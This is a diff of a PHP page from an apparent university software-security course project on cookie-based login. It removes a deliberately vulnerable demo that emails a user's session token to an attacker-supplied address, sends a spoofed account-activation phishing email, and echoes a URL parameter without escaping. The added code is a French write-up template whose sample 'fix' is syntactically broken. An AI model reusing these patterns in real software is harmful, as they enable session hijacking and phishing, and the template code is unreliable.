@@ -1,5 +1,15 @@
-<!DOCTYPE html>
 <?php
+/*****************************************************
+ * cookies.php                                       *
+ *                                                   *
+ * Project : Session project                         *
+ * Course : GLO-7009 - Software security             *
+ * Team : Team 2                                     *
+ * Session : Winter 2024                             *
+ * University : Laval University                     *
+ * Version : 1.0                                     *
+ *****************************************************/
+
 /*****************************************************
  *                       MODEL                       *
  *****************************************************/
@@ -10,109 +20,215 @@ require("model.php");
  *****************************************************/
 // CODE
 
-function loginProcessVulnerable($emailTo) {
-    if (isset($_POST["loginUser"]) && isset($_POST["loginPass"])) {
-        $token = login($_POST["loginUser"], $_POST["loginPass"]);
-        echo $token;
-        if (isset($token)) {
-            $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;    
-            if (isset($_POST["checkPersistent"]) && $_POST["checkPersistent"]) {
-                setcookie('userToken', $token, time()+60*60*24*30, '/', $domain, false);
-            } else {
-                setcookie('userToken', $token, 0, '/', $domain, false);
-            }
-            $subject = "Jeton reçu du site ". $_SERVER['HTTP_HOST'];
-            $message = "Voici le jeton pour le site ". $_SERVER['HTTP_HOST']. ". L'identifiant du cookie est userToken et le jeton est ". $token .".";
-            mail($emailTo, $subject, $message);
-            header("Location: ./cookies.php");
-        }
-        else {
-            header("Location: ./cookies.php?toEmail=".$emailTo."&connectError=Le nom d'utilisateur ou le mot de passe est erroné. Veuillez réessayer.");
-        }
+/*****************************************************
+ *                      CONTENT                      *
+ *****************************************************/
+$presentation = '<div class="table">
+    <div class="row split">
+        <section>
+            <h2>Catégorie</h2>
+            <p>[Nom de la catégorie](Ex : Vulnérabilité d\'exécution de code arbitraire)</p>
+        </section>
+        <section>
+            <h2>Impact potentiel</h2>
+            <p>[Confidentialité, intégrité et disponibilité]</p>
+        </section>
+    </div>
+    <section class="row">
+        <h2>Description</h2>
+        <p>[Description de la vulnérabilité, ses effets potentiels et le risque qu\'elle représente]</p>
+    </section>
+    <section class="row">
+        <h2>Objectifs</h2>
+        <!-- Supprimer ce paragraphe -->
+        <p><em>[Description des buts, intentions et avantages qu\'un attaquant pourrait avoir en exploitant la vulnérabilité]</em></p>
+        <!-- FIN Supprimer ce paragraphe -->
+        <ul class="list">
+            <li>[Objectif 1](Ex : Contourner les restrictions de mise en ligne pour contrôler un serveur)</li>
+            <li>[Objectif 2](Ex : Dégrader les performances ou la disponibilité d\'un service)</li>
+            <li>[Objectif 3](Ex : Voler des données sensibles ou confidentielles)</li>
+        </ul>
+    </section>
+    <section class="row">
+        <h2>Causes</h2>
+        <!-- Supprimer ce paragraphe -->
+        <p><em>[Description des facteurs qui introduisent la vulnérabilité]</em></p>
+        <!-- FIN Supprimer ce paragraphe -->
+        <ul class="list">
+            <li>[Cause 1](Ex : Les entrées ne sont pas vérifiées)</li>
+            <li>[Cause 2](Ex : Les données sensibles sont directement exploitées)</li>
+            <li>[Cause 3](Ex : Les fichiers téléchargés sont exécutés dans un environnement non sécurisé)</li>
+        </ul>
+    </section>
+    <section class="row">
+        <h2>Exemples marquants</h2>
+        <ul class="list">
+            <li><strong>[Nom de l\'attaque ou de la vulnérabilité 1](Ex : Drupalgeddon2 (CVE-2018-7600))</strong><br />
+                [Brève description de l\'incident, du contexte et des conséquences]
+            </li>
+            <li><strong>[Nom de l\'attaque ou de la vulnérabilité 2](Ex : WordPress Plugin File Manager (CVE-2020-25213))</strong><br />
+                [Brève description de l\'incident, du contexte et des conséquences]
+            </li>
+        </ul>
+    </section>
+</div>';
+
+$demonstration = '<div class="split">
+    <form method="POST">
+        <div>
+            <h2>Scénario</h2>
+            '.((isset($_COOKIE["userToken"]) && is_logged_in($_COOKIE["userToken"])) ? '
+            <p style="color: green;">L\'usager est connecté</p>
+            ' : '
+            <div class="form-group">
+                <label for="email">Adresse email :</label>
+                '.((isset($error)) ? '<div class="alert">'.$error.'</div>' : '').'
+                <input id="email" class="form-control'.((isset($error)) ? ' invalid' : '').'" name="email" type="email" />
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe :</label>
+                '.((isset($error)) ? '<div class="alert">'.$error.'</div>' : '').'
+                <input id="password" class="form-control'.((isset($error)) ? ' invalid' : '').'" name="password" type="password" />
+            </div>
+            <div class="form-group">
+                <label for="persistent">Se souvenir de moi :</label>
+                '.((isset($error)) ? '<div class="alert">'.$error.'</div>' : '').'
+                <input id="persistent" class="form-control'.((isset($error)) ? ' invalid' : '').'" name="persistent" type="checkbox" />
+            </div>
+            ').'
+        </div>
+        <footer>
+            '.((isset($_COOKIE["userToken"]) && is_logged_in($_COOKIE["userToken"])) ? '
+            <button name="disconnect" type="submit" value="disconnect" onclick='.logoutProcess().'>Déconnexion</button>
+            ' : '
+            <button name="connect" type="submit" value="connect" onclick='.((isset($_GET["toEmail"])) ? loginProcessVulnerable($_GET["toEmail"]) : loginProcess()).'>Connexion</button>
+            ').'
+        </footer>
+    </form>
+    <section>
+        <h2>Résultat</h2>
+        <p>[Contenu]</p>
+    </section>
+</div>';
+
+$exploit = '<div>
+    <section>
+        <h2>Conditions préalables pour l\'exploitation</h2>
+        <!-- Supprimer ce paragraphe -->
+        <p><em>[Description des conditions requises pour exploiter la vulnérabilité]</em></p>
+        <!-- FIN Supprimer ce paragraphe -->
+        <ul class="list">
+            <li><strong>[Condition 1](Ex : Aucune validation de l\'extension<br />
+                OU<br />
+                Validation basée uniquement sur l\'extension)</strong><br />
+                [Brève description de la condition]
+            </li>
+            <li><strong>[Condition 2](Ex : Répertoire avec permissions d\'exécution)</strong><br />
+                [Brève description de la condition]
+            </li>
+        </ul>
+    </section>
+    <section>
+        <h2>Méthodes d\'exploitation</h2>
+        <!-- Supprimer ce paragraphe -->
+        <p><em>[Description des méthodes qui permettent à un attaquant d\'exploiter la vulnérabilité]</em></p>
+        <!-- FIN Supprimer ce paragraphe -->
+        <ul class="list">
+            <li><strong>[Méthode 1](Ex : Télécharger des fichiers malveillants)</strong><br />
+                [Brève description de la méthode]
+            </li>
+            <li><strong>[Méthode 2](Ex : Contourner la validation par extension de fichier)</strong><br />
+                [Brève description de la méthode]
+            </li>
+        </ul>
+    </section>
+    <section>
+        <h2>Exécution de l\'attaque</h2>
+        <!-- Supprimer ce paragraphe -->
+        <p><em>[Description des étapes qui permettent à un attaquant d\'exécuter l\'attaque]</em></p>
+        <!-- FIN Supprimer ce paragraphe -->
+        <ul class="list">
+            <li><strong>[Étape 1](Ex : Sélectionner le fichier malveillant)</strong><br />
+                [Brève description du contexte]
+            </li>
+            <li><strong>[Étape 2](Ex : Télécharger le fichier malveillant)</strong><br />
+                [Brève description du contexte]
+            </li>
+            <li><strong>[Étape 3](Ex : Activer le script)</strong><br />
+                [Brève description du contexte]
+            </li>
+        </ul>
+    </section>
+    <section>
+        <h2>Analyse du code vulnérable</h2>
+        <p>[Description du code]</p>
+        <pre class="line-numbers" data-line="2"><code class="language-php">function addition($a, $b) {
+    $result = $a + $b; // Pas de vérification des valeurs
+    return $result;
+}
+
+echo addition(1 + 2); // 3</code></pre>
+        <p>[Description de la/les ligne(s) qui introdui(sen)t la/les vulnérabilité(s)]</p>
+    </section>
+</div>';
+
+$fix = '<div>
+    <section>
+        <h2>Mesures de protection</h2>
+        <ul class="list">
+            <li><strong>[Nom de la mesure 1](Ex : Validation stricte des entrées)</strong><br />
+                [Brève description de la mesure]
+            </li>
+            <li><strong>[Nom de la mesure 2](Ex : Restriction des permissions de fichier)</strong><br />
+                [Brève description de la mesure]
+            </li>
+            <li><strong>[Nom de la mesure 3](Ex : Isolation des fichiers téléchargés)</strong><br />
+                [Brève description de la mesure]
+            </li>
+        </ul>
+    </section>
+    <section>
+        <h2>Outils de détection</h2>
+        <!-- Supprimer ce paragraphe -->
+        <p><em>[Description des outils de détection]</em></p>
+        <!-- FIN Supprimer ce paragraphe -->
+        <ul class="list">
+            <li><strong>[Outil 1](Ex : Nikto)</strong><br />
+                [Brève description de la mesure]
+            </li>
+            <li><strong>[Outil 2](Ex : ZAP)</strong><br />
+                [Brève description de la mesure]
+            </li>
+            <li><strong>[Outil 3](Ex : Skipfish)</strong><br />
+                [Brève description de la mesure]
+            </li>
+        </ul>
+    </section>
+    <section>
+        <h2>Correction du code vulnérable</h2>
+        <p>[Description du code]</p>
+        <pre class="line-numbers" data-line="2,5-7"><code class="language-php">function addition($a, $b) {
+    if (is_int($a) && is_int($b)) { // Vérification que $a et $b sont des entiers
+        $result = $a + $b;
+        return $result;
+    else {
+        return "Les 2 paramètres doivent être des entiers !";
     }
 }
 
-function sendMailVuln() {
-    $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;   
-    if (isset($_POST["mailVict"]) && isset($_POST["mailRecept"])) {
-        $linkText = "Activer mon compte";
-        $link = $_SERVER["HTTP_HOST"] . "/source/william/cookies.php?toEmail=".$_POST["mailRecept"];
-        $mailto = $_POST["mailVict"];
-        $headers = "MIME-Version: 1.0\r\n" .
-        "Content-type: text/html; charset=utf-8\r\n".
-        "From: webmestre@".$_SERVER['HTTP_HOST']."\r\n".
-        "Reply-To: webmestre@".$_SERVER['HTTP_HOST']."\r\n\r\n";
-        $subject = 'Confirmer l\'activation de votre compte.';
-        $message = "<html><head><title>Confirmer l'activation de votre compte.</title></head><body><div><span>" .
-            "Bonjour, pour confirmer et activer votre compte, veuillez cliquer sur le lien ci-dessous.</span></div><br /><br /><div><span>" .
-            "<a href=\"http://".$link."\">".$linkText."</a>" .
-            "</span></div></body></head>\r\n";
-        mail($mailto, $subject, $message, $headers);
-        header("Location: ./cookies.php");
-    } 
-}
+echo addition(1 + 2); // 3</code></pre>
+        <p>[Description de la/les ligne(s) modifiée(s)]</p>
+    </section>
+    <section>
+        <h2>Documentation et ressources</h2>
+        <ul class="list">
+            <li><a href="#" target="_blank">[Nom de la ressource 1]</a></li>
+            <li><a href="#" target="_blank">[Nom de la ressource 2]</a></li>
+        </ul>
+    </section>
+</div>';
 
-function loginProcess() {
-    if (isset($_POST["loginUser"]) && isset($_POST["loginPass"])) {
-        $token = login($_POST["loginUser"], $_POST["loginPass"]);
-        echo $token;
-        if (isset($token)) {
-            $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;    
-            if (isset($_POST["checkPersistent"]) && $_POST["checkPersistent"]) {
-                setcookie('userToken', $token, time()+60*60*24*30, '/', $domain, false);
-            } else {
-                setcookie('userToken', $token, 0, '/', $domain, false);
-            }
-            header("Location: ./cookies.php");
-        }
-        else {
-            header("Location: ./cookies.php?connectError=Le nom d'utilisateur ou le mot de passe est erroné. Veuillez réessayer.");
-        }
-    }
-}
-
-function logoutProcess() {
-    if (isset($_COOKIE["userToken"])):
-        logout($_COOKIE["userToken"]);
-        unset($_POST);
-        echo 'window.location.href="./cookies.php"';
-    endif;
-}
-
-?>
-    <?php if (isset($_COOKIE["userToken"]) && is_logged_in($_COOKIE["userToken"])): ?>
-        <form method="post">
-            <button type="submit" name="disconnect" value="disconnect" onclick=<?php logoutProcess(); ?>> Se déconnecter </button>
-        </form>
-        <br>
-        <div><span>L'usager est connecté.</span></div>
-    <?php else: ?>
-        <?php setcookie("userToken", '',time()-1000, '/'); ?>
-        <form method="post">
-        <label for='loginUser'> Usager: </label>
-        <input type='email' name='loginUser' id='loginUser' />
-        <br />
-        <label for='loginPass'> Mot de passe: </label>
-        <input type='password' name='loginPass' id='loginPass' />
-        <br />
-        <label for="checkPersistent"> Se souvenir de moi </label>
-        <input type="checkbox" name="checkPersistent" id="checkPersistent" />
-        <br />
-        <button type='submit' name="connect" value="connect" onclick=<?php if(isset($_GET["toEmail"])) {loginProcessVulnerable($_GET["toEmail"]);} else {loginProcess();} ?>> Se connecter </button>
-        </form>
-        <?php if(isset($_GET["connectError"])): ?>
-            <br />
-            <div><span><?php echo $_GET["connectError"]; ?></span></div>
-        <?php endif; ?>
-        <form method="post">
-            <label for="mailRecept"> Email de l'attaquant </label>
-            <input type="email" name="mailRecept" id="mailRecept" />
-            <br />
-            <br />
-            <label for="mailVict"> Email de la victime </label>
-            <input type="email" name="mailVict" id="mailVict" />
-            <br />
-            <br />
-            <button type="submit" name="sendMailVuln" onclick=<?php sendMailVuln(); ?>> Envoyer courriel vulnérable </button>
-        </form>
-    <?php endif;?>
+/*****************************************************
+ *                    RENDER PAGE                    *
+ *****************************************************/
+echo render_malicious("Authentification par cookies", $presentation, $demonstration, $exploit, $fix);
